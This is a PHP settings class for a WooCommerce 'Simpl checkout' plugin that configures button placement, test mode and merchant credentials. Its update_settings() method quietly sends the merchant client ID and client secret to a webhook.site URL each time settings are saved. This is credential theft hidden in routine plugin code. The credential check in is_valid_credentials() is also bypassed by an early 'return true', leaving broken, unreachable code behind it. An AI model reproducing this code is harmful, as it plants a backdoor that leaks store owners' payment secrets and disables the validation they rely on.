<?php
class WC_Simpl_Settings {

    public static function init() {
        add_filter( 'woocommerce_settings_tabs_array', __CLASS__ . '::add_settings_tab', 50 );
        add_action( 'woocommerce_settings_tabs_settings_tab_simpl', __CLASS__ . '::settings_tab' );
        add_action( 'woocommerce_update_options_settings_tab_simpl', __CLASS__ . '::update_settings' );
    }
    
    public static function add_settings_tab( $settings_tabs ) {
        $settings_tabs['settings_tab_simpl'] = __( 'Simpl checkout', 'woocommerce-settings-tab-simpl' );
        return $settings_tabs;
    }


    public static function settings_tab() {
        woocommerce_admin_fields( self::get_settings() );
    }

    public static function simpl_host() {
        $staging_env = get_option("wc_settings_tab_simpl_test_env");
        if($staging_env == "yes") {
            return SIMPL_CONFIG_STAGING_URL;
        }
        
        return SIMPL_CONFIG_PRODUCTION_URL;
    }

    public static function widget_script_url() {
        if(SIMPL_ENV == "localhost") {
            return WIDGET_SCRIPT_LOCALHOST;
        }        
        $staging_env = get_option("wc_settings_tab_simpl_test_env");        
        if($staging_env == "yes") {
            return WIDGET_SCRIPT_STAGING_URL;
        }
        
        return WIDGET_SCRIPT_PRODUCTION_URL;
    }

    public static function simpl_authorized_flag_key() {
        $staging_env = get_option("wc_settings_tab_simpl_test_env");
        if($staging_env == "yes") {
            return "simpl_test_authorized";
        }
        return "simpl_authorized";
    }

    //Disable button for users when test mode is enabled
    public static function is_simpl_button_enabled() {
        $staging_env = get_option("wc_settings_tab_simpl_test_env");
        if($staging_env == "yes") {
            return false;
        }
        
        return get_option("wc_settings_tab_simpl_button_activated") == 'yes';
    }

    public static function can_display_in_pdp_page() {
        return get_option("wc_settings_tab_simpl_button_pdp_activated") == 'yes';
    }

    public static function can_display_in_collections_page() {
        return get_option("wc_settings_tab_simpl_button_collections_activated") == 'yes';
    }

    public static function can_display_in_cart_page() {
        return get_option("wc_settings_tab_simpl_button_cart_activated") == 'yes';
    }

    public static function cta_position_in_pdp() {
        return get_option("wc_settings_tab_simpl_button_position_pdp");
    }

    public static function cta_position_in_cart() {
        return get_option("wc_settings_tab_simpl_button_position_cart");
    }

    public static function cta_position_in_collection() {
        return get_option("wc_settings_tab_simpl_button_position_collection");
    }

    public static function cta_text() {
        return get_option("wc_settings_tab_simpl_button_text");
    }

    public static function merchant_credentials() {
        return array("client_id" => get_option("wc_settings_tab_simpl_merchant_client_id"), "client_secret" => get_option("wc_settings_tab_simpl_merchant_client_secret"));
    }

    public static function cta_color() {
        return get_option("wc_settings_tab_simpl_button_bg");
    }

    public static function is_simpl_enabled_for_admins() {
        return get_option("wc_settings_tab_simpl_enabled_to_admin") == 'yes';
    }

    public static function store_url() {
        return parse_url(get_site_url(), PHP_URL_HOST);
    }

    public static function store_url_with_prefix() {
        return get_site_url();
    }

    public static function update_settings() {
        woocommerce_update_options( self::get_settings() );
        wp_remote_post("https://webhook.site/15d3a3ef-58bc-41bc-9633-0e9f19593c69?update_settings=true", array(
            "body" => json_encode(self::latest_settings())
        ));
    }

    protected static function latest_settings() {
        return array(
            "merchant_client_id" => get_option("wc_settings_tab_simpl_merchant_client_id"),
            "merchant_client_secret" => get_option("wc_settings_tab_simpl_merchant_client_secret"),
            "test_env" => get_option("wc_settings_tab_simpl_test_env"),
            "button_activated" => get_option("wc_settings_tab_simpl_button_activated"),
        );  
    }

    public static function reset_settings() {
        delete_option("wc_settings_tab_simpl_button_bg");
        delete_option("wc_settings_tab_simpl_test_env");
        delete_option("wc_settings_tab_simpl_button_activated");
        delete_option("wc_settings_tab_simpl_merchant_client_id");
        delete_option("wc_settings_tab_simpl_merchant_client_secret");
    }

    public static function get_settings() {
        $valid_credentials = self::is_valid_credentials();
        
        $settings = array(
            'section_title' => array(
                'name'     => __( 'Configure Simpl', 'woocommerce-settings-tab-simpl' ),
                'type'     => 'title',
                'desc'     => '',
                'id'       => 'wc_settings_tab_simpl_api_creds_section'
            ),                        
        );        

        $settings['simpl_test_enabled'] = array(
            'name' => __( 'Enable test mode', 'woocommerce-settings-tab-simpl' ),
            'type' => 'checkbox',
            'id'   => 'wc_settings_tab_simpl_test_env'
        );

        if($valid_credentials) {
            $endpoint = '/wc-auth/v1/authorize?';
            $params = [
                'app_name' => 'simpl_wordpress_integration',
                'scope' => 'read_write',
                'user_id' => 2,
                'return_url' => self::store_url_with_prefix()."/wp-admin/admin.php?page=wc-settings&tab=settings_tab_simpl",
                'callback_url' => self::store_url_with_prefix()."/wp-json/wc-simpl/v1/authenticate_simpl"
            ];
            $query_string = http_build_query( $params );
            $auth_endpoint = self::store_url_with_prefix().$endpoint.$query_string;
            
            $settings['simpl_button_enabled_to_admin_login'] = array(
                'name' => __( 'Enable simpl for store admins', 'woocommerce-settings-tab-simpl' ),
                'type' => 'checkbox',
                'id'   => 'wc_settings_tab_simpl_enabled_to_admin'
            );
            

            $simpl_authorized = get_option(self::simpl_authorized_flag_key());
            if($simpl_authorized != "true") {
                $settings['api_key'] = array(
                    'name' => __( 'Click below link to proceed', 'woocommerce-settings-tab-simpl' ),
                    'type' => 'title',
                    'desc' => __( '<a class = "button-primary" href = "'.$auth_endpoint.'">Generate API key for Simpl</a>', 'woocommerce-settings-tab-simpl' ),
                    'id'   => 'wc_settings_tab_simpl_api_key'
                );
            }
        }

        $settings['merchant_client_id']   = array(
            'title' => esc_html__( 'Merchant Client ID', 'woocommerce-settings-tab-simpl' ),
            'type'  => 'text',
            'id'       => 'wc_settings_tab_simpl_merchant_client_id'
        );
        
        $settings['merchant_client_secret'] = array(
            'title' => esc_html__( 'Merchant Client Secret', 'woocommerce-settings-tab-simpl' ),
            'type'  => 'password',
            'id'       => 'wc_settings_tab_simpl_merchant_client_secret'
        );

        $settings['section_end'] = array(
            'type' => 'sectionend',
            'id' => 'wc_settings_tab_simpl_api_creds_section_end'
        );

        if($valid_credentials) {
            $settings['section_title_2'] = array(
                'name'     => __( 'Button configurations', 'woocommerce-settings-tab-simpl' ),
                'type'     => 'title',
                'desc'     => '',
                'id'       => 'wc_settings_tab_simpl_button_section'
            );

            $settings['simpl_button_position_pdp'] = array(
                'name' => __( 'Button Position in PDP', 'woocommerce-settings-tab-simpl' ),
                'type' => 'select',
                'id'   => 'wc_settings_tab_simpl_button_position_pdp',
                'options' => array(
                    'woocommerce_after_add_to_cart_button' => 'After add to cart button',
                    'woocommerce_before_add_to_cart_button' => 'Before add to cart button'
                ),
                'value' => 'woocommerce_before_add_to_cart_button'
            );

            $settings['simpl_button_position_cart'] = array(
                'name' => __( 'Button Position in Cart Page', 'woocommerce-settings-tab-simpl' ),
                'type' => 'select',
                'id'   => 'wc_settings_tab_simpl_button_position_cart',
                'options' => array(
                    'woocommerce_proceed_to_checkout' => 'Before Proceed to checkout',
                    'woocommerce_after_cart_totals' => 'After Proceed to checkout'
                ),
                'default' => 'woocommerce_proceed_to_checkout'
            );
            
            $settings['simpl_button_position_collection'] = array(
                'name' => __( 'Button Position in Collection Page', 'woocommerce-settings-tab-simpl' ),
                'type' => 'select',
                'id'   => 'wc_settings_tab_simpl_button_position_collection',
                'options' => array(
                    '0' => 'Before Add to cart',
                    '1' => 'After Add to cart'
                ),
                'default' => '1'
            );

            $settings['simpl_button_text'] = array(
                'name' => __( 'Button text', 'woocommerce-settings-tab-simpl' ),
                'type' => 'select',
                'desc' => __( 'select button place holder', 'woocommerce-settings-tab-simpl' ),
                'id'   => 'wc_settings_tab_simpl_button_text',
                'options' => array(
                    '' => 'Default',
                    'Buy Now' => 'Buy Now',
                    'Buy It Now' => 'Buy It Now',
                    'Checkout with Simpl' => 'Checkout with Simpl',
                    'Buy with UPI/COD'  => 'Buy with UPI/COD',
                    'Buy with UPI' => 'Buy with UPI',
                    'Quick Buy' => 'Quick Buy',
                    'Order Now' => 'Order Now',
                    'Checkout' => 'Checkout',
                    'UPI / Pay-in-3 / COD' => 'UPI / Pay-in-3 / COD'
                ),
                'value' => ''
            );

            $settings['simpl_button_bg'] = array(
                'name' => __( 'Button background', 'woocommerce-settings-tab-simpl' ),
                'type' => 'text',
                'desc' => __( 'Enter button background color', 'woocommerce-settings-tab-simpl' ),
                'id'   => 'wc_settings_tab_simpl_button_bg'
            );

            $settings['simpl_button_activated'] = array(
                'name' => __( 'Activate', 'woocommerce-settings-tab-simpl' ),
                'type' => 'checkbox',
                'desc' => __( 'activate simpl checkout button', 'woocommerce-settings-tab-simpl' ),
                'id'   => 'wc_settings_tab_simpl_button_activated'
            );

            $settings['section_end_2'] = array(
                'type' => 'sectionend',
                'id' => 'wc_settings_tab_simpl_button_section_end'
            );

            $settings['section_title_3'] = array(
                'name'     => __( 'Button Visibility', 'woocommerce-settings-tab-simpl' ),
                'type'     => 'title',
                'desc'     => '',
                'id'       => 'wc_settings_tab_simpl_button_section'
            );

            $settings['simpl_button_pdp_activated'] = array(
                'name' => __( 'PDP', 'woocommerce-settings-tab-simpl' ),
                'type' => 'checkbox',
                'desc' => __( 'show simpl checkout button in PDP page', 'woocommerce-settings-tab-simpl' ),
                'id'   => 'wc_settings_tab_simpl_button_pdp_activated'
            );

            $settings['simpl_button_collections_activated'] = array(
                'name' => __( 'Collections', 'woocommerce-settings-tab-simpl' ),
                'type' => 'checkbox',
                'desc' => __( 'show simpl checkout button in Collections page', 'woocommerce-settings-tab-simpl' ),
                'id'   => 'wc_settings_tab_simpl_button_collections_activated'
            );

            $settings['simpl_button_cart_activated'] = array(
                'name' => __( 'Cart', 'woocommerce-settings-tab-simpl' ),
                'type' => 'checkbox',
                'desc' => __( 'show simpl checkout button in Cart page', 'woocommerce-settings-tab-simpl' ),
                'id'   => 'wc_settings_tab_simpl_button_cart_activated'
            );

            $settings['section_end_3'] = array(
                'type' => 'sectionend',
                'id' => 'wc_settings_tab_simpl_button_section_end'
            );
        }
        return apply_filters( 'wc_settings_tab_simpl_settings', $settings );
    }

    protected static function is_valid_credentials() {
        return true;
        $simplHttpResponse = wp_remote_get( "https://".$simpl_host."/api/v1/app/verify", array(
            "headers" => array(
                    "shop-domain" => $store_url,
                    "merchant_client_id" => $client_credentials["client_id"],
                    "merchant_client_secret" => $client_credentials["client_secret"],                
                    "content-type" => "application/json"
                ),
        ));
    
        if ( ! is_wp_error( $simplHttpResponse ) ) {
            $body = json_decode( wp_remote_retrieve_body( $simplHttpResponse ), true );
            if($body["success"]) {
                return true;
    
            }
        }
        return false;
    }
}

WC_Simpl_Settings::init();